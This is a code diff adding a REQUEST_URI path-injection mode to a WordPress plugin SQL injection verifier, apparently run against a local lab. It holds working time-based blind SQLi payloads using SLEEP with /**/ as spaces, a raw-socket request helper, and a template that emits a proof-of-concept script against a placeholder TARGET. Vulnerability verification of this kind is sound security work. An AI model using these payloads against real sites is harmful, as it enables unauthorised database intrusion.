@@ -4594,6 +4594,7 @@ def verify_wordpress_sqli(
     _lab_ref: Optional[list] = None,
     json_body: bool = False,
     required_role: str = "subscriber",
+    sqli_via_request_uri: bool = False,
 ) -> WpVerifyResult:
     """Verifica SQL injection con CINCO tecnicas, de mas a menos dura, probando varios contextos
     de inyeccion (numerico sin comillas, comilla simple, comilla doble, cierre de parentesis) y
@@ -4788,6 +4789,141 @@ def verify_wordpress_sqli(
         # cada peticion. Esta linea solo asegura WP_DEBUG=true por coherencia.
         lab.wp_cli("config", "set", "WP_DEBUG", "true", "--raw", "--type=constant",
                   timeout=30)
+
+        # REQUEST_URI injection fast-path: cuando el taint source es $_SERVER['REQUEST_URI'],
+        # la inyeccion va en el PATH HTTP (no en query param). Tecnica: raw socket con
+        # comilla literal + /**/ como espacio SQL. Solo time-based blind (error/boolean no
+        # afloran via 404 HTML).
+        if sqli_via_request_uri:
+            step("modo REQUEST_URI activo: inyeccion via path HTTP (raw socket)")
+            # Habilitar pretty permalinks para que WordPress PHP procese cualquier path
+            lab.wp_cli("rewrite", "structure", "/%postname%/", timeout=30)
+            lab.wp_cli("rewrite", "flush", "--hard", timeout=30)
+            step("pretty permalinks habilitados (necesarios para que template_redirect dispare)")
+
+            # Seed al menos una fila en las tablas del plugin para que el query SQL
+            # tenga filas que evaluar (LEFT JOIN no evalua ON si la tabla izquierda esta vacia)
+            _plugin_tables_uri = _detect_plugin_tables(plugin_source_dir)
+            if _plugin_tables_uri:
+                _seed_plugin_tables(lab, boot.db_pw, _plugin_tables_uri, step,
+                                    sqli_param=sqli_param,
+                                    sqli_param_value=orig_value,
+                                    plugin_source_dir=plugin_source_dir)
+                step(f"seed data insertado en tablas del plugin: {_plugin_tables_uri}")
+            else:
+                # Seed generico: buscar tablas plugin via MySQL LIKE
+                _slug_clean = re.sub(r'[^a-z0-9]', '', slug.lower()) if slug else ""
+                if _slug_clean:
+                    _mt = lab.exec_mysql(
+                        f"SELECT table_name FROM information_schema.tables WHERE "
+                        f"table_schema=DATABASE() AND table_name LIKE 'wp_%{_slug_clean}%';",
+                        boot.db_pw)
+                    if _mt:
+                        _mt_names = [t.strip().lstrip('wp_') for t in _mt.strip().split('\n')
+                                     if t.strip().startswith('wp_')]
+                        if _mt_names:
+                            _seed_plugin_tables(lab, boot.db_pw, _mt_names, step,
+                                                sqli_param=sqli_param,
+                                                sqli_param_value=orig_value,
+                                                plugin_source_dir=plugin_source_dir)
+                            step(f"seed via MySQL LIKE: {_mt_names}")
+
+            import socket as _sock_uri, time as _time_uri
+
+            def _raw_path_request(path: str, timeout: float = 20.0) -> float:
+                """Envia GET {path} via raw socket (sin URL-encoding) y mide el tiempo."""
+                host_uri = "localhost"
+                port_uri = int(boot.base_url.split(":")[-1]) if ":" in boot.base_url else 80
+                s = _sock_uri.socket(_sock_uri.AF_INET, _sock_uri.SOCK_STREAM)
+                s.settimeout(timeout)
+                t0 = _time_uri.time()
+                try:
+                    s.connect((host_uri, port_uri))
+                    req_line = f"GET {path} HTTP/1.1\r\nHost: {host_uri}:{port_uri}\r\nConnection: close\r\n\r\n"
+                    s.sendall(req_line.encode("latin-1", errors="replace"))
+                    buf = b""
+                    while True:
+                        try:
+                            chunk = s.recv(4096)
+                            if not chunk:
+                                break
+                            buf += chunk
+                        except _sock_uri.timeout:
+                            break
+                except Exception:
+                    pass
+                finally:
+                    s.close()
+                return _time_uri.time() - t0
+
+            # Payloads: OR para forzar evaluacion aunque la condicion de page_url sea FALSE
+            # La comilla cierra la cadena, OR SLEEP evalua siempre (no depende del contenido de la tabla)
+            _uri_pairs = [
+                # OR variant (fuerza evaluacion en cualquier contexto de clausula)
+                (f"/{orig_value or 'x'}'/**/OR/**/(SELECT/**/3/**/FROM/**/(SELECT/**/SLEEP(5))A)--",
+                 f"/{orig_value or 'x'}'/**/OR/**/(SELECT/**/3/**/FROM/**/(SELECT/**/SLEEP(0))A)--"),
+                # AND variant (funciona si la condicion previa ya es TRUE)
+                (f"/{orig_value or 'x'}'/**/AND/**/(SELECT/**/3/**/FROM/**/(SELECT/**/SLEEP(5))A)--",
+                 f"/{orig_value or 'x'}'/**/AND/**/(SELECT/**/3/**/FROM/**/(SELECT/**/SLEEP(0))A)--"),
+            ]
+
+            _uri_timing_tried = []
+            _uri_consistent = 0
+            for _slow_p, _fast_p in _uri_pairs:
+                step(f"probando path injection: SLOW={_slow_p!r}")
+                _t_fast = _raw_path_request(_fast_p, timeout=10)
+                _t_slow = _raw_path_request(_slow_p, timeout=25)
+                _delayed = (_t_slow - _t_fast) >= 3.5
+                _uri_timing_tried.append({
+                    "slow": _slow_p, "fast": _fast_p,
+                    "slow_s": round(_t_slow, 2), "fast_s": round(_t_fast, 2),
+                    "retraso_consistente": _delayed,
+                })
+                step(f"  SLEEP(5)={_t_slow:.2f}s SLEEP(0)={_t_fast:.2f}s "
+                     f"→ {'RETRASO!' if _delayed else 'sin retraso'}")
+                if _delayed:
+                    _uri_consistent += 1
+                    break  # Un par confirmado es suficiente
+
+            res.evidence["uri_timing_intentos"] = _uri_timing_tried
+            if _uri_consistent >= 1:
+                res.verified = True
+                res.ok = True
+                _uri_win = next(t for t in _uri_timing_tried if t["retraso_consistente"])
+                res.evidence["tecnica"] = "request-uri-sqli-time-blind"
+                res.evidence["sqli_param"] = "REQUEST_URI"
+                res.evidence["endpoint"] = "/"
+                res.detail = (f"SQLI CONFIRMADO (time-based blind via REQUEST_URI): "
+                              f"SLEEP(5)={_uri_win['slow_s']}s vs SLEEP(0)={_uri_win['fast_s']}s "
+                              f"(diferencial={_uri_win['slow_s']-_uri_win['fast_s']:.2f}s)")
+                step(f"VERIFICADO: REQUEST_URI SQLi — {res.detail}")
+                # Build PoC para el informe
+                _uri_poc_path = _uri_win["slow"]
+                res.exploit_poc = (
+                    f"# CVE via REQUEST_URI path injection\n"
+                    f"# SLEEP(5) response vs SLEEP(0) control\n"
+                    f"# Target: {boot.base_url}\n\n"
+                    f"python3 -c \"\nimport socket, time\n"
+                    f"def probe(path):\n"
+                    f"    s=socket.create_connection(('TARGET', 80), timeout=30)\n"
+                    f"    t0=time.time()\n"
+                    f"    s.sendall(f'GET {{path}} HTTP/1.1\\r\\nHost: TARGET\\r\\nConnection: close\\r\\n\\r\\n'.encode('latin-1'))\n"
+                    f"    s.recv(65536); s.close()\n"
+                    f"    return time.time()-t0\n"
+                    f"print('SLEEP(0):', probe({_uri_win['fast']!r}))\n"
+                    f"print('SLEEP(5):', probe({_uri_poc_path!r}))\n"
+                    f"\""
+                )
+            else:
+                res.failure_trace.append({
+                    "attempt_n": 0, "technique": "request-uri-time-blind",
+                    "causa": "sin_retraso",
+                    "detail": f"ninguno de {len(_uri_pairs)} pares mostro retraso >= 3.5s",
+                    "timing": _uri_timing_tried,
+                })
+                step(f"REQUEST_URI time-blind FALLO: {len(_uri_pairs)} pares sin retraso")
+            res.evidence["screenshots"] = boot.shots
+            return res
 
         if boot.shortcode_page_path and attack_endpoint_is_bare_root:
             # solo se REDIRIGE el ataque a la pagina del shortcode cuando el endpoint dado era la
